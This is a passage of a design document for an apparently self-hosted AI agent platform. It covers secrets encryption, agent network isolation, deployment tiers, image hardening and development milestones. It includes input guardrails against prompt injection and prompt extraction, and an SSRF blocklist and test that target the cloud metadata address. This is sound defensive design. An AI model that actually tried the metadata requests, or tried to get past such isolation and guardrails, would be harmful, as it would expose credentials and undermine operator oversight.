CREATE EXTENSION IF NOT EXISTS vector;

CREATE TABLE memory_embeddings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    workspace_id UUID NOT NULL REFERENCES workspaces(id),
    agent_id UUID NOT NULL REFERENCES agents(id),
    content TEXT NOT NULL,
    embedding vector(1536),  -- dimension matches embedding model (ada-002 = 1536)
    metadata JSONB,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- HNSW index for fast approximate nearest neighbor search
CREATE INDEX idx_memory_embedding ON memory_embeddings
  USING hnsw (embedding vector_cosine_ops)
  WITH (m = 16, ef_construction = 64);

-- Semantic search query:
-- SELECT content, 1 - (embedding <=> $1) AS similarity
-- FROM memory_embeddings
-- WHERE workspace_id = $2 AND agent_id = $3
-- ORDER BY embedding <=> $1
-- LIMIT 10;
```

- Sufficient for Tier 1 scale (single tenant, thousands to tens-of-thousands of memories)
- HNSW index provides sub-10ms queries up to ~100K vectors
- Embedding model configurable via LLM Router (default: model provider's embedding API)
- Docker image: `pgvector/pgvector:pg16` (includes pgvector extension pre-installed)

**Tier 3+ — OpenSearch:**
- Index per tenant, k-NN search, scales to millions of vectors
- OpenSearch Dashboards for exploration
- Also serves as the audit search backend (shared infrastructure)

**Migration (Tier 1 → Tier 3):** `honorclaw memory export` dumps embeddings as JSONL with vectors → bulk-index into OpenSearch. No re-embedding needed.

---

## 12. Secrets Management

### Architecture (Tiered)

| Tier | Provider | Backend | Ceremony |
|------|----------|---------|----------|
| **Tier 1** | `BuiltInSecretsProvider` | PostgreSQL `honorclaw_secrets` table, AES-256-GCM | `honorclaw init` (one command) |
| **Tier 2** | `BuiltInSecretsProvider` or `VaultSecretsProvider` | PostgreSQL or Vault | Same, or Vault init |
| **Tier 3+** | `VaultSecretsProvider` | HashiCorp Vault | Standard Vault init/unseal |
| **Cloud** | Cloud-native adapter | Secrets Manager / Secret Manager / Key Vault | Cloud IAM |

### Tier 1: Built-In Secrets (BuiltInSecretsProvider)

For single-node deployments, secrets are stored encrypted in PostgreSQL — no Vault, no external service, no unseal ceremony.

**How it works:**

```
                    Master Key (single root of trust)
                         │
                         ▼
┌─────────────────────────────────────────────────┐
│  PostgreSQL: honorclaw_secrets table              │
│                                                   │
│  path (TEXT)          │ value_encrypted (BYTEA)   │
│  ─────────────────────┼─────────────────────────  │
│  llm/anthropic-key    │ AES-256-GCM(master, val) │
│  slack/bot-token      │ AES-256-GCM(master, val) │
│  oidc/okta/secret     │ AES-256-GCM(master, val) │
└─────────────────────────────────────────────────┘

On startup:
1. Read master key (env var, file, or prompted)
2. SELECT * FROM honorclaw_secrets
3. Decrypt all values → hold in-memory cache
4. Zero master key source material from process memory
5. Serve getSecret() calls from cache (no DB round-trip)
```

**Master key modes:**

| Mode | Config | How It Works | Best For |
|------|--------|-------------|----------|
| **Environment variable** | `master_key_source: "env"` | `HONORCLAW_MASTER_KEY` (base64-encoded 32 bytes) | Docker Compose, CI/CD |
| **Key file** | `master_key_source: "file"` | Reads `/etc/honorclaw/master.key` (32 bytes, mode 0400) | systemd, automated deploys |
| **Passphrase** | `master_key_source: "prompt"` | Prompted on startup, Argon2id KDF → 32-byte key | Interactive setup, max security |

**Init ceremony:**
```bash
honorclaw init
# 1. Generates 32-byte random master key
# 2. Creates PostgreSQL schema (all tables + RLS)
# 3. Generates RSA-2048 JWT signing key pair
# 4. Encrypts signing key with master key, stores in honorclaw_secrets
# 5. Creates admin user (email/password prompted)
# 6. Writes honorclaw.yaml with Tier 1 provider defaults
# 7. Outputs master key (base64) — user saves this securely
#
# Total: one command, ~5 seconds, zero external dependencies
```

**Database schema:**
```sql
CREATE TABLE honorclaw_secrets (
    path TEXT PRIMARY KEY,                -- e.g., 'llm/anthropic-key'
    value_encrypted BYTEA NOT NULL,       -- AES-256-GCM ciphertext
    nonce BYTEA NOT NULL,                 -- 12-byte GCM nonce (unique per row)
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Application-level enforcement: Control Plane is the only service with DB access
-- Agent Runtime is on a different Docker network — cannot reach PostgreSQL
```

**Security analysis — why this is sufficient for Tier 1:**
- The master key is the single root of trust (same as Vault's unseal key, but without the Shamir ceremony overhead)
- AES-256-GCM provides authenticated encryption — tampering is detected
- Secrets are only in plaintext in the Control Plane's process memory — never on disk, never in environment variables of other containers
- The agent runtime cannot reach PostgreSQL (Docker network isolation) — same guarantee as Vault+NetworkPolicy, simpler mechanism
- For Tier 1's threat model (single-tenant, trusted operator), this provides equivalent security to Vault with dramatically less operational complexity

### Tier 3+: HashiCorp Vault

For multi-tenant Kubernetes deployments, Vault provides:
- **Dynamic secrets**: Short-lived database credentials, cloud IAM tokens — reduces blast radius
- **Transit engine**: Encryption-as-a-service for per-workspace encryption keys
- **Kubernetes-native auth**: Pods authenticate via service account — no static tokens
- **Audit logging**: Every secret access logged, feeds into HonorClaw's audit pipeline
- **Shamir's Secret Sharing**: Distributed unseal for enterprise key ceremony requirements

**Migration path (Tier 1 → Tier 3):** `honorclaw secrets export | vault kv import -` — CLI command decrypts secrets from PostgreSQL and imports into Vault. Atomic migration.

### How Agent Cannot Read Its Own Credentials (All Tiers)

Enforced at multiple levels regardless of tier:

1. **Network isolation**: Agent Runtime has no network path to the secrets backend (no PostgreSQL access in Tier 1, no Vault access in Tier 3+). Docker `internal: true` networks (Tier 1) or Kubernetes NetworkPolicy (Tier 3+).

2. **Architecture**: Secrets are fetched by the Control Plane and injected at the point of use:
   - LLM API keys: Control Plane's LLM Router fetches them and makes the API call. The key never enters the agent runtime.
   - Integration credentials: Channel Adapters (running in the Control Plane process in Tier 1) fetch them.
   - Tool credentials: Tool Execution Layer injects as env vars into ephemeral tool containers, destroyed after execution.

3. **No environment variable injection**: Agent containers receive only: `SESSION_ID`, `REDIS_ENDPOINT`, `LOG_LEVEL`.

### Rotation

| Secret Type | Tier 1 | Tier 3+ |
|-------------|--------|---------|
| LLM provider API keys | Manual (Admin UI or CLI) | Manual or Vault rotation policy |
| PostgreSQL credentials | Static (single-tenant, trusted) | Vault dynamic secrets (short-lived) |
| Redis AUTH | Static | Vault-managed, rotated on schedule |
| Slack tokens | Rotated on re-installation | Same |
| Tool secrets | Tenant-managed via Admin UI | Same, stored in Vault |
| JWT signing keys | `honorclaw keys rotate` CLI | Vault Transit auto-rotation |

---

## 13. Tech Stack

### Language: TypeScript (Node.js)

**Why TypeScript over Python or Go:**

- **Streaming support**: LLM streaming (SSE, WebSocket) is first-class in Node.js
- **Type safety**: Critical for a security product — capability manifest schemas, tool definitions, and API contracts need compile-time verification
- **Ecosystem**: Anthropic SDK, OpenAI SDK — strongest in TypeScript
- **Solo developer efficiency**: One language across the entire stack (API, Web UI, CLI, SDK)
- **Kubernetes client**: `@kubernetes/client-node` is mature for dynamic Pod management

### Framework: Fastify (API) + tRPC (internal RPC)

- **Fastify**: Fast, TypeScript-native, built-in schema validation (Ajv), WebSocket support
- **tRPC**: Type-safe internal RPC between Control Plane and Channel Adapters
- **Not Express**: Fastify is 2-5x faster with better TypeScript support

### Monorepo Structure

```
honorclaw/
├── packages/
│   ├── core/                    # Shared types, schemas, utilities
│   ├── control-plane/           # Main API server + agent orchestration
│   ├── agent-runtime/           # Sandboxed agent execution container
│   ├── channels/
│   │   ├── slack/
│   │   ├── web/
│   │   ├── api/
│   │   └── cli/
│   ├── tools/                   # First-party tool implementations
│   │   ├── web-search/
│   │   ├── database-query/
│   │   ├── file-ops/
│   │   ├── http-request/
│   │   ├── email-send/
│   │   └── code-execution/

│   ├── rag/                     # RAG pipeline (chunker, embeddings, vector-store, ingest)
│   ├── guardrails/              # Input guardrail layer (injection, tool discovery, PII)
│   ├── workflows/               # Workflow engine (V2+)
│   ├── providers/               # Cloud provider implementations
│   │   ├── aws/                 # @honorclaw/provider-aws
│   │   ├── gcp/                 # @honorclaw/provider-gcp
│   │   ├── azure/               # @honorclaw/provider-azure
│   │   └── self-hosted/         # @honorclaw/provider-self-hosted (Vault, MinIO, etc.)
│   ├── web-ui/                  # React SPA
│   └── cli/                     # CLI client (includes promptfoo wrapper for evals)
│
├── infra/
│   ├── terraform/               # Cloud-agnostic with provider modules
│   │   ├── modules/
│   │   │   ├── kubernetes/      # Cluster provisioning (EKS/GKE/AKS)
│   │   │   ├── postgresql/      # DB provisioning (Aurora/CloudSQL/managed/operator)
│   │   │   ├── redis/           # Cache provisioning
│   │   │   ├── pgvector/        # pgvector provisioning (Tier 3+: managed PostgreSQL)
│   │   │   ├── storage/         # Object storage (S3/GCS/Blob)
│   │   │   ├── vault/           # Vault deployment
│   │   │   ├── keycloak/        # Keycloak deployment
│   │   │   ├── monitoring/      # Prometheus + Grafana
│   │   │   └── networking/      # VPC/VNet + ingress
│   │   ├── targets/
│   │   │   ├── aws/             # AWS-specific root module
│   │   │   ├── gcp/             # GCP-specific root module
│   │   │   ├── azure/           # Azure-specific root module
│   │   │   └── self-hosted/     # On-prem root module (k3s + operators)
│   │   └── environments/
│   │       ├── dev/
│   │       ├── staging/
│   │       └── production/
│   ├── helm/                    # Helm charts for HonorClaw components
│   │   ├── honorclaw/            # Umbrella chart
│   │   ├── control-plane/
│   │   ├── agent-runtime/
│   │   └── tool-runner/
│   └── docker/
│       ├── honorclaw.Dockerfile           # Single-container (s6-overlay, Alpine)
│       ├── agent-runtime.Dockerfile       # Mode 3 only (distroless)
│       ├── tool-runner.Dockerfile
│       ├── docker-compose.hardened.yml    # Mode 3 (docker-socket-proxy)
│       ├── honorclaw-seccomp.json         # Custom seccomp profile
│       └── s6/                            # s6-overlay service definitions
│
├── docs/
│   ├── architecture/
│   ├── security/
│   ├── api/
│   └── tools/                   # Tool development guide
│       ├── getting-started.md
│       ├── sdk-reference.md
│       └── security-review.md
│
├── turbo.json
├── pnpm-workspace.yaml
└── package.json
```

### Additional Key Dependencies

| Component | Purpose | Scope |
|-----------|---------|-------|
| **s6-overlay** | Process supervisor for Tier 1 single-container (manages PostgreSQL, Redis, Ollama, Control Plane as child processes) | Runtime (Tier 1 image) |
| **promptfoo** | Eval framework — model-graded + rule-based + statistical evaluation of agent outputs, CI integration | devDependency only (not in production image) |
| **bcryptjs** | Password hashing (pure JS, no native bindings — compatible with Alpine) | Runtime |
| **Zod** | Schema validation for manifests, API input, tool I/O | Runtime |

### IaC: Terraform with Cloud-Agnostic Module Structure

Terraform modules are organized by **capability** (not by cloud service), with cloud-specific implementations in `targets/`:

```
infra/terraform/
├── modules/
│   ├── kubernetes/
│   │   ├── main.tf          # Input variables (cluster_name, node_pools, etc.)
│   │   ├── eks.tf           # AWS EKS implementation
│   │   ├── gke.tf           # GCP GKE implementation
│   │   ├── aks.tf           # Azure AKS implementation
│   │   └── outputs.tf       # Uniform outputs (kubeconfig, cluster_endpoint, etc.)
│   ├── postgresql/
│   │   ├── aurora.tf        # AWS Aurora
│   │   ├── cloudsql.tf      # GCP Cloud SQL
│   │   ├── azure-flex.tf    # Azure Flexible Server
│   │   └── operator.tf      # CloudNativePG operator (on-prem)
│   └── ...
│
├── targets/
│   ├── aws/
│   │   └── main.tf          # Wires modules with provider=aws
│   ├── gcp/
│   │   └── main.tf          # Wires modules with provider=gcp
│   └── self-hosted/
│       └── main.tf          # Wires modules with provider=self-hosted
```

Each module uses a `provider` variable to select the cloud-specific resource blocks. Outputs are normalized so the Helm charts and application config don't care which cloud they're running on.

### CI/CD Pipeline

```
GitHub Actions:
  PR → lint + typecheck + unit tests + security scan (Trivy/Semgrep/gitleaks)
     → integration tests (k3s + testcontainers for PostgreSQL/Redis/OpenSearch)
     → container build + vulnerability scan

  main → all above
       → deploy to staging (automatic)
       → integration tests against staging
       → deploy to production (manual approval gate)

  Infrastructure:
       → Terraform plan (PR comment)
       → Terraform apply (manual approval on merge)

  Tool submissions:
       → Automated security scan pipeline
       → OPA policy validation
       → CVE scan + SBOM generation
```

---

## 14. Deployment Tiers & Container Strategy

### Deployment Tiers

HonorClaw supports four deployment tiers, from a single `docker run` to fully cloud-managed Kubernetes. The application code is identical across all tiers — only the provider configuration and infrastructure orchestration differ.

| Tier | Orchestration | Services Required | Target Use Case | Multi-Tenant | HA |
|------|--------------|-------------------|----------------|-------------|-----|
| **Tier 1: Single Container (Mode 2 default)** | `docker run` (s6-overlay) | **1 container** — PostgreSQL + Redis + Ollama + agent runtime as s6-supervised child processes | Dev, demo, small enterprise, air-gapped on-prem | Single workspace | No |
| **Tier 1: High-Security (Mode 3)** | Docker Compose V2 | **5 containers** (honorclaw + postgres + redis + ollama + agent-runtime) via `docker-compose.security-full.yml` | Regulated industries (healthcare, finance, gov) | Single workspace | No |
| **Tier 2: K3s or Docker Swarm** | K3s / Swarm | Same images, multi-node | Medium enterprise, on-prem, edge | Multi-workspace (RBAC) | Basic |
| **Tier 3: Kubernetes** | K8s (kubeadm, RKE2, Rancher) | Full service mesh + operators | Large enterprise, on-prem, private cloud | Multi-workspace (RBAC + optional RLS) | Full |
| **Tier 4: Cloud-Managed** | EKS / GKE / AKS | Managed K8s + managed data services | Cloud enterprise | Multi-workspace | Full |

### Tier 1: Single-Container (Mode 2 — Canonical Default)

> ⚠️ **Updated (2026-03-06):** Tier 1 is now a **single-container s6-overlay image**. PostgreSQL, Redis, Ollama, and the redis-proxy run as s6-supervised child processes inside the honorclaw container. The agent runtime runs as an on-demand child process of the Control Plane in a Linux network namespace. The docker-compose below is **Mode 3 (high-security)** only — not the default. See Prompt 0.6 for the canonical implementation.

The canonical single-node deployment is **one docker run command** — one container, one volume, zero external dependencies. No Vault, no Keycloak, no OpenSearch, no MinIO, no Fluent Bit.

```yaml
# docker-compose.yml — HonorClaw Tier 1 Deployment
# Usage: make init && make up
# Services: 4 containers (3 user-visible services). That's it.

x-hardened: &hardened
  restart: unless-stopped
  read_only: true
  user: "65534:65534"
  security_opt: ["no-new-privileges:true"]
  cap_drop: ["ALL"]
  logging:
    driver: "json-file"
    options: { max-size: "50m", max-file: "5" }

services:
  # ─── HonorClaw (Control Plane + Adapters + Tool Execution) ─
  honorclaw:
    <<: *hardened
    image: ghcr.io/jjj-mo3/honorclaw:${HONORCLAW_VERSION:-latest}
    ports:
      - "${HONORCLAW_PORT:-8443}:8443"     # API + WebSocket
      - "${HONORCLAW_WEB_PORT:-3000}:3000"  # Web UI
    networks: [control, data]
    tmpfs:
      - /tmp:size=200M
    environment:
      - HONORCLAW_CONFIG=/config/honorclaw.yaml
      - HONORCLAW_MASTER_KEY=${HONORCLAW_MASTER_KEY}
      - LOG_LEVEL=${LOG_LEVEL:-info}
    volumes:
      - ./honorclaw.yaml:/config/honorclaw.yaml:ro
      - /var/run/docker.sock:/var/run/docker.sock:ro  # spawn agent + tool containers
      - honorclaw-data:/data                            # local filesystem storage
    depends_on:
      postgres: { condition: service_healthy }
      redis: { condition: service_healthy }
    healthcheck:
      test: ["CMD", "/healthcheck"]
      interval: 10s
      timeout: 3s
      retries: 3

  # ─── Agent Runtime (ISOLATED — no internet access) ────────
  agent-runtime:
    <<: *hardened
    image: ghcr.io/jjj-mo3/agent-runtime:${HONORCLAW_VERSION:-latest}
    networks: [agents]            # internal: true → NO internet gateway
    security_opt:
      - "no-new-privileges:true"
      - "seccomp:./seccomp-agent.json"
    tmpfs:
      - /tmp:size=50M,noexec
    environment:
      - REDIS_ENDPOINT=redis://redis:6379
      - LOG_LEVEL=${LOG_LEVEL:-info}
    deploy:
      resources:
        limits: { cpus: "2.0", memory: 2G }

  # ─── PostgreSQL (pgvector for vector memory + all data) ───
  postgres:
    image: pgvector/pgvector:pg16       # PostgreSQL 16 + pgvector extension
    restart: unless-stopped
    networks: [data]
    user: "999:999"
    volumes:
      - postgres-data:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: honorclaw
      POSTGRES_USER: honorclaw
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U honorclaw"]
      interval: 5s
      timeout: 3s
      retries: 5

  # ─── Redis (working memory + pub/sub) ─────────────────────
  redis:
    image: redis:7-alpine
    restart: unless-stopped
    command: >
      redis-server
      --requirepass "${REDIS_PASSWORD}"
      --maxmemory 512mb
      --maxmemory-policy allkeys-lru
      --appendonly yes
    networks: [data, agents]      # agents can reach Redis for pub/sub
    volumes:
      - redis-data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "-a", "${REDIS_PASSWORD}", "ping"]
      interval: 5s
      timeout: 3s
      retries: 5

  # ─── Ollama (local LLM + embeddings — zero external API keys) ─
  ollama:
    image: ollama/ollama:latest
    restart: unless-stopped
    networks: [control]           # Only Control Plane reaches Ollama — NOT agent runtime
    volumes:
      - ollama-data:/root/.ollama
    healthcheck:
      test: ["CMD", "ollama", "list"]
      interval: 10s
      timeout: 5s
      retries: 5
    # GPU passthrough (optional, dramatically improves inference speed):
    # deploy:
    #   resources:
    #     reservations:
    #       devices:
    #         - driver: nvidia
    #           count: 1
    #           capabilities: [gpu]

networks:
  control:                        # HonorClaw control plane
    driver: bridge
  agents:                         # Agent runtime — ISOLATED
    driver: bridge
    internal: true                # ← no external gateway = no internet
  data:                           # Database tier
    driver: bridge
    internal: true

volumes:
  postgres-data:
  redis-data:
  honorclaw-data:                  # local filesystem storage (audit exports, tool workspace)
  ollama-data:                    # Ollama model weights
```

**That's it. One container (Tier 1) or five containers (Mode 3), zero external services, zero API keys required, one command.**

The `honorclaw` container includes: Control Plane, Web UI, Channel Adapters (Slack, API, CLI), Tool Execution Layer, and Policy Proxy — all in a single process. Auth (built-in bcrypt/TOTP/JWT/OIDC), secrets (AES-256-GCM in PostgreSQL), audit (append-only PostgreSQL table), and vector memory (pgvector) are all built into the Control Plane. Ollama provides local LLM inference and embeddings — no external API keys needed.

**What was eliminated vs. the original design:**

| Removed Service | Replaced By |
|----------------|-------------|
| **Vault** | `BuiltInSecretsProvider` — secrets encrypted in PostgreSQL with master key |
| **Keycloak** | `BuiltInIdentityProvider` — bcrypt + TOTP + JWT + OIDC built into Control Plane |
| **OpenSearch** | pgvector extension in PostgreSQL |
| **MinIO** | Local filesystem (`/data` volume) |
| **Fluent Bit** | `PostgresAuditSink` — append-only table with mutation triggers |
| **Separate channel adapters** | Built into `honorclaw` container |
| **Separate policy proxy** | Built into `honorclaw` container |
| **Separate tool runner** | Built into `honorclaw` container |

**Key design decisions:**

- **`networks.agents.internal: true`** — Docker's `internal` flag removes the default gateway at the kernel level (iptables/nftables). Agent containers physically cannot reach the internet. Same enforcement mechanism as Kubernetes NetworkPolicy, just coarser-grained.
- **Agent Runtime remains a separate container** — this preserves the Capability Sandwich. A compromised agent process cannot access Control Plane memory (master key, decrypted secrets, manifests) and cannot reach PostgreSQL (different Docker network).
- **Policy Proxy runs in-process (Tier 1 only)** — it's a module within the Control Plane, not a separate container. Still enforces per-agent egress allowlists when spawning tool containers via Docker socket. For Tier 3+ (Kubernetes), it becomes a separate Pod with its own NetworkPolicy.
- **Master key via `.env`** — `HONORCLAW_MASTER_KEY` in `.env` file. For production, encrypt `.env` with SOPS + age.

### Getting Started (Tier 1)

```bash
# 1. Initialize (creates DB schema, master key, admin user)
docker run --rm -it -v honorclaw-data:/data ghcr.io/jjj-mo3/honorclaw:latest init
# → Enter admin email: admin@example.com
# → Enter admin password: ********
# → Master key generated: Qm9AZGFzZGZhc2RmYXNkZmFzZGY=
# → Keep this key safe!

# 2. Start (single container — PostgreSQL, Redis, Ollama all inside)
docker run -d --name honorclaw \
  -p 3000:3000 \
  -v honorclaw-data:/data \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --cap-add SYS_ADMIN \
  ghcr.io/jjj-mo3/honorclaw:latest

# 3. Open http://localhost:3000 — log in, create your first agent
```

**Data volume:** Single `/data/` volume contains PostgreSQL data, Redis snapshots, Ollama models, secrets, config, and file storage.

**Scale-out:** Set `POSTGRES_URL` and `REDIS_URL` env vars to use external managed databases (RDS, ElastiCache). The embedded instances are skipped automatically. Zero code change.

### Secrets in Tier 1

No Vault, no ceremony. See Section 12 for the full `BuiltInSecretsProvider` design.

| What | Where | Encrypted By |
|------|-------|-------------|
| LLM API keys, Slack tokens | `honorclaw_secrets` table (PostgreSQL) | AES-256-GCM (master key) |
| JWT signing key | `honorclaw_secrets` table (PostgreSQL) | AES-256-GCM (master key) |
| PostgreSQL / Redis passwords | `.env` file | SOPS + age (recommended for production) |
| Master key | `.env` file or key file | SOPS + age, OS keychain, or prompted on startup |

**SOPS + age (optional, recommended for production):**
```bash
# Encrypt .env at rest
age-keygen -o honorclaw.key
sops --encrypt --age $(age-keygen -y honorclaw.key) .env > .env.enc

# Decrypt and start
sops exec-env .env.enc 'docker compose up -d'
```

### Tier 2: K3s or Docker Swarm

**Use case:** Medium deployments, multi-node on-prem, HA without cloud dependency.

- **K3s** (recommended): Single-binary Kubernetes, supports NetworkPolicy (Calico/Cilium), runs Helm charts. Uses the same Helm charts as Tier 3/4.
- **Docker Swarm**: Alternative for teams without Kubernetes experience. Same Docker images. Swarm overlay networks for cross-node isolation.

Both tiers can use either built-in providers (Tier 1 defaults) or external services (Vault, Keycloak, OpenSearch) depending on requirements. Provider config in `honorclaw.yaml` controls this — no code change.

```bash
# K3s deployment
curl -sfL https://get.k3s.io | sh -
helm install honorclaw ./infra/helm/honorclaw \
  --set providers.secrets=builtin \
  --set providers.identity=builtin \
  --values ./environments/on-prem-values.yaml
```

### Tier 3: Kubernetes (Full)

Standard Kubernetes deployment (EKS, GKE, AKS, RKE2, kubeadm). Helm charts, full NetworkPolicy enforcement, operators for stateful services. External providers recommended:

- **Secrets**: Vault (`VaultSecretsProvider`) with Kubernetes auth
- **Auth**: Keycloak (`KeycloakIdentityProvider`) with per-tenant realms, or built-in with OIDC federation
- **Memory**: OpenSearch for vector search at scale
- **Audit**: Fluent Bit → S3-compatible WORM + OpenSearch
- **Storage**: MinIO or cloud S3-compatible

### Tier 4: Cloud-Managed

Same application containers as Tier 3, with managed data services: PostgreSQL → Aurora/Cloud SQL, Redis → ElastiCache/Memorystore, OpenSearch → managed, storage → S3/GCS/Blob. Provider config switches from self-hosted to cloud-managed.

### Hardened Docker Images

Every HonorClaw image follows security best practices:

**Build strategy — multi-stage with distroless:**

```dockerfile
# ── Build stage ─────────────────────────────────────────────
FROM node:20-alpine AS build
WORKDIR /app
COPY package.json pnpm-lock.yaml ./
RUN corepack enable && pnpm install --frozen-lockfile --prod
COPY . .
RUN pnpm build && pnpm prune --prod

# ── Production stage ────────────────────────────────────────
FROM gcr.io/distroless/nodejs20-debian12:nonroot

# No shell. No package manager. No debugging tools.
# Only Node.js runtime + application code.

COPY --from=build --chown=65534:65534 /app/dist /app/dist
COPY --from=build --chown=65534:65534 /app/node_modules /app/node_modules
COPY --from=build --chown=65534:65534 /app/package.json /app/package.json
COPY --from=build /app/healthcheck /healthcheck

WORKDIR /app
USER 65534:65534

ENTRYPOINT ["/nodejs/bin/node", "dist/index.js"]
```

**Image hardening checklist (enforced in CI):**

| Requirement | Enforcement | Rationale |
|------------|-------------|-----------|
| Non-root user | `USER 65534` + OPA admission policy | Prevents privilege escalation |
| Read-only root filesystem | `readOnlyRootFilesystem: true` | Prevents runtime modification |
| No shell | Distroless base (no `/bin/sh`) | Prevents shell injection |
| Minimal base | `distroless/nodejs20` (~40MB) | Smallest attack surface |
| No secrets in layers | Multi-stage build | `docker history` reveals nothing |
| All capabilities dropped | `cap_drop: ["ALL"]` | No Linux capabilities |
| No privilege escalation | `no-new-privileges:true` | No setuid/setgid |
| Signed images | Cosign + Sigstore | Tamper-proof distribution |
| SBOM attached | Syft → Cosign attestation | Supply chain transparency |
| Zero critical CVEs | Trivy CI gate | No known vulnerabilities |

**Debug variant** (Alpine-based, for troubleshooting only):
```
ghcr.io/jjj-mo3/honorclaw:1.0.0          # distroless (production)
ghcr.io/jjj-mo3/honorclaw:1.0.0-debug    # Alpine (debugging only)
```

### Image Publishing & Signing

Published to **GitHub Container Registry (GHCR)** with keyless Cosign signatures:

```bash
# CI signs every release image via GitHub OIDC (no static keys)
cosign sign --yes ghcr.io/jjj-mo3/honorclaw:1.0.0

# Users verify before deploying
cosign verify ghcr.io/jjj-mo3/honorclaw:1.0.0 \
  --certificate-identity=https://github.com/JJJ-Mo3/honorclaw/.github/workflows/release.yml@refs/tags/v1.0.0 \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com

# SBOM inspection
cosign verify-attestation --type spdx ghcr.io/jjj-mo3/honorclaw:1.0.0
```

**Guarantees:**
1. **Keyless signing** via Sigstore — no long-lived signing keys to manage or leak
2. **Transparency log** (Rekor) — every signature publicly auditable
3. **Kubernetes admission** — Kyverno/Connaisseur enforce signature verification at deploy time
4. **SBOM attestation** — full dependency list attached to every image

### Tier Comparison

| Aspect | Tier 1 (Compose) | Tier 2 (K3s/Swarm) | Tier 3 (K8s) | Tier 4 (Cloud) |
|--------|-----------------|-------------------|-------------|----------------|
| **Containers** | 4 (honorclaw, agent, postgres, redis) | Same + optional Vault/Keycloak | Full service mesh | Same + managed services |
| **Agent isolation** | Docker `internal` network | NetworkPolicy (K3s) | Full NetworkPolicy (Cilium/Calico) | + cloud VPC |
| **Auth** | Built-in (bcrypt/TOTP/JWT/OIDC) | Built-in or Keycloak | Keycloak (per-tenant realms) | Keycloak or Cognito |
| **Secrets** | Built-in (AES-256-GCM in PostgreSQL) | Built-in or Vault | Vault (K8s auth, dynamic secrets) | Vault or cloud-native |
| **Vector memory** | pgvector (PostgreSQL) | pgvector or OpenSearch | OpenSearch | Managed OpenSearch |
| **Audit** | PostgreSQL append-only | PostgreSQL or Fluent Bit | Fluent Bit → WORM + search | Same + cloud services |
| **Object storage** | Local filesystem | Local or MinIO | MinIO or S3-compatible | S3 / GCS / Blob |
| **HA** | None | Basic (replicas) | Full (anti-affinity, PDBs, multi-AZ) | + managed failover |
| **Setup** | `make init && make up` | `helm install` | `terraform apply && helm install` | Same |

### Upgrading Between Tiers

Tiers are **upward-compatible**. The same `honorclaw.yaml` works across all tiers — only the `providers` section changes.

```bash
# Tier 1 → Tier 2: Same images on K3s
honorclaw export --format helm-values > values.yaml
helm install honorclaw ./infra/helm/honorclaw -f values.yaml

# Tier 1 → Tier 3: Export data, switch providers
honorclaw secrets export | vault kv import -        # secrets → Vault
honorclaw memory export | opensearch-bulk-import     # vectors → OpenSearch
honorclaw audit export | honorclaw audit import-worm  # audit → WORM storage
# Update honorclaw.yaml providers, helm install

# Any tier: data is always in PostgreSQL + Redis — portable by default
```

---

## 15. Development Phases

### Section 0: Foundation

**Scope:** Monorepo scaffolding, core runtime loop, auth, provider abstraction, single-container deployment

**Key deliverables:**
- Turborepo + pnpm workspace with all packages
- Ten provider abstraction interfaces (`SecretsProvider`, `IdentityProvider`, `EncryptionProvider`, `AuditSink`, `StorageProvider`, `QueueProvider`, `ComputeProvider`, `OutputFilterProvider`, `BudgetProvider`, `EmbeddingService`)
- Tier 1 built-in implementations for all providers
- Single-container Dockerfile with s6-overlay (PostgreSQL + Redis + Ollama as child processes)
- Control Plane: Fastify server, built-in JWT auth, workspace context middleware
- Agent Runtime: Basic message loop (receive prompt → call LLM → return response)
- Agent process isolation via Linux network namespaces (`unshare(CLONE_NEWNET)`)
- LLM Router: Claude adapter (Anthropic API) — single provider first
- Redis pub/sub transport (Unix socket + TCP proxy for agent namespace)
- Per-session Redis ACLs (dynamic user creation per session)
- Canonical PostgreSQL schema (14 tables)
- Redis channel schema (`agent:`, `tools:`, `llm:` with BLPOP async flow)
- CI pipeline: lint + test + build
- Cosign image signing pipeline in CI
- `honorclaw init` + `docker run` deployment flow

**Acceptance criteria:**
- [ ] `docker run --rm -it -v honorclaw-data:/data honorclaw init` creates DB, admin user, master key
- [ ] `docker run -d -p 3000:3000 ...` starts all services via s6-overlay
- [ ] Agent runtime spawned in network namespace — cannot reach internet or PostgreSQL
- [ ] Agent calls Claude and returns a response
- [ ] Per-session Redis ACLs: agent session A cannot read session B's channels
- [ ] Provider abstraction works: can swap built-in for external via `honorclaw.yaml`
- [ ] All images pass hardening checks (non-root, read-only, no CVEs)
- [ ] Images signed with Cosign and published to GHCR

### Section 1: Security Core

**Scope:** Capability manifests, tool sandboxing, network isolation, audit logging, input guardrails

**Key deliverables:**
- Capability manifest schema + validation (including `input_guardrails`, `budget`, `llm_rate_limits` blocks)
- Tool Execution Layer: manifest enforcement, parameter validation, rate limiting
- **Input Guardrail Layer**: pre-LLM rule engine — injection detection, tool discovery blocking, prompt extraction blocking, PII filtering, topic restriction
- **SSRF IP blocklist**: Parameter Sanitizer with RFC 1918/loopback/IMDS blocklist + DNS rebinding mitigation
- Policy Proxy: egress filtering (domain allowlist per agent)
- Agent namespace network isolation (Tier 1); NetworkPolicy (Tier 3+)
- Audit logging: PostgreSQL append-only with RAISE EXCEPTION triggers (Tier 1); Fluent Bit → WORM (Tier 3+)
- **Output filtering**: PII + credential detection via OutputFilterProvider
- First-party tools: web_search, file_read, file_write, http_request (all sandboxed, `--read-only` + `--tmpfs /tmp`)
- Human-in-the-loop approval flow
- `honorclaw tools init` scaffolding command

**Acceptance criteria:**
- [ ] Agent cannot call a tool not in its manifest
- [ ] Agent cannot reach the internet (namespace isolation at Tier 1, NetworkPolicy at Tier 3+)
- [ ] Tool parameters validated against manifest constraints
- [ ] SSRF: tool requesting `http://169.254.169.254` is blocked
- [ ] Input guardrail: "list your tools" blocked when `block_tool_discovery: true`
- [ ] All tool calls audit-logged with immutable storage
- [ ] PII and credentials in agent output detected and redacted
- [ ] Custom tool can be built with SDK and run in sandbox

### Section 2: Interfaces + Multi-Tenant

**Scope:** Slack integration, Web UI, CLI, multi-tenant isolation, SSO

**Key deliverables:**
